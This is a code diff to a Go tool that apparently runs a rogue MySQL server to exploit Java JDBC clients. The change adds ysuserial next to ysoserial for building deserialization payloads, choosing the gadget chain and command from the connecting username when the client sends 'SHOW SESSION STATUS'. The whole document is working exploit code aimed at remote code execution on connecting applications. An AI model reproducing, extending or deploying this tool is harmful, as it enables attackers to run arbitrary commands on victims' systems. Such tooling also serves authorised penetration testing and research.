@@ -19,6 +19,7 @@ const Version = "v0.0.1"
 var addr = flag.String("addr", "0.0.0.0:3306", "listen addr")
 var javaBinPath = flag.String("java", "java", "java bin path")
 var ysoserialPath = flag.String("ysoserial", "ysoserial-0.0.6-SNAPSHOT-all.jar", "ysoserial bin path")
+var ysuserialPath = flag.String("ysuserial", "ysuserial-0.9-su18-all.jar", "ysuserial bin path")
 
 func init() {
 	flag.Parse()
@@ -200,7 +201,9 @@ func handleAccept(conn net.Conn) {
 		if requestQuery.Command == 3 {
 			log.Printf("[-] request query statement: %s\n", requestQuery.Statement)
 			if strings.Contains(requestQuery.Statement, "SHOW SESSION STATUS") {
-				if !strings.HasPrefix(username, "yso") {
+				useYso := strings.HasPrefix(username, "yso")
+				useYsu := strings.HasPrefix(username, "ysu")
+				if !useYso && !useYsu {
 					return
 				}
 				params := strings.Split(username, "_")
@@ -211,7 +214,14 @@ func handleAccept(conn net.Conn) {
 				payload := params[1]
 				command := params[2]
 
-				cmd := exec.Command(*javaBinPath, "-jar", *ysoserialPath, payload, command)
+				var cmd *exec.Cmd
+				if useYso {
+					cmd = exec.Command(*javaBinPath, "-jar", *ysoserialPath, payload, command)
+				} else if useYsu {
+					cmd = exec.Command(*javaBinPath, "-jar", *ysuserialPath, "-g", payload, "-p", command)
+				}
+
+				log.Printf("[-] exec: %s\n", cmd.String())
 				poc, err := cmd.CombinedOutput()
 				if err != nil {
 					log.Printf("[x] gen ysoserial poc error : %s\n", err.Error())
